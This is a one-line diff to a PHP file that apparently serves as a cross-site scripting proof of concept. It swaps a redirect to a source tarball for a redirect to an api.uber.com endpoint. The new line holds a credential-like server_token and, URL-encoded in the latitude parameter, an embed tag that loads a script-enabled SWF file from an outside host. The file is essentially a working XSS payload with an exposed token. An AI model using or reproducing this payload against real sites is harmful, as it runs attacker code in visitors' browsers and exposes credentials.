@@ -1,1 +1,1 @@
-<?php header('location: https://archive.uber.com/pypi/packages/source/I/IgnoreMe_mime/IgnoreMe_mime-1.0.1.tar.gz')?>
+<?php header('location: https://api.uber.com/v1/products?server_token=r3IFxM3lubYxjEIgBa2Z_3JQm8QnWdZYYPr2cW3t&latitude=%3C?PXML%3E%3Chtml:embed%20allowscriptaccess=always%20src=https:%26%23x2f%3b%26%23x2f%3bl0.cm%26%23x2f%3bxss.swf%3E')?>
